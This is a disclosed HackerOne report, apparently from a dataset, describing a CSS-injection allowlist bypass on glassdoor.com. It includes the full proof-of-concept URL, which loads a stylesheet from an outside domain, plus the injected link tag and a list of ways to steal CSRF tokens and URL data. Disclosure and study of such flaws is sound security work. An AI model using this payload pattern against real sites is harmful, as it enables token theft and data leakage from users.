---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1250730'
original_report_id: '1250730'
title: CSS injection via link tag whitelisted-domain bypass - https://www.glassdoor.com
team_handle: glassdoor
created_at: '2021-07-03T17:36:27.089Z'
disclosed_at: '2021-12-02T17:17:48.058Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: https://www.glassdoor.com/*
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
---

# CSS injection via link tag whitelisted-domain bypass - https://www.glassdoor.com

## Metadata

- HackerOne Report ID: 1250730
- Weakness: 
- Program: glassdoor
- Disclosed At: 2021-12-02T17:17:48.058Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

It is possible load an arbitrary .css file. Bypassing the protections by adding the domain `https://www.glassdoor.com` in a parameter/path.

### Affected URL or select Asset from In-Scope: 

- https://www.glassdoor.com/api/widget/apiError.htm?action=employer-single-review&css=https://zonduu.me/example.css?http://www.glassdoor.com/&format=320x280&responsetype=embed&reviewid=3762318&version=1&format=320x280&responsetype=embed&reviewid=3762318&version=1

### Affected Parameter:

- css

### Browsers tested:

- All

## Steps To Reproduce:

- https://www.glassdoor.com/api/widget/apiError.htm?action=employer-single-review&css=https://zonduu.me/example.css?http://www.glassdoor.com/&format=320x280&responsetype=embed&reviewid=3762318&version=1&format=320x280&responsetype=embed&reviewid=3762318&version=1

It will inject `https://zonduu.me/example.css?http://www.glassdoor.com/` in the href of the second link tag.

```html
<link href='https://zonduu.me/example.css?http://www.glassdoor.com/' rel='stylesheet' type='text/css' media='all' />
```

`www.glassdoor.com` needs to be in input otherwise the server rejects it.

## Impact Description:

## Impact

- Executing arbitrary JavaScript using IE's expression() function.
- Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.
- Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
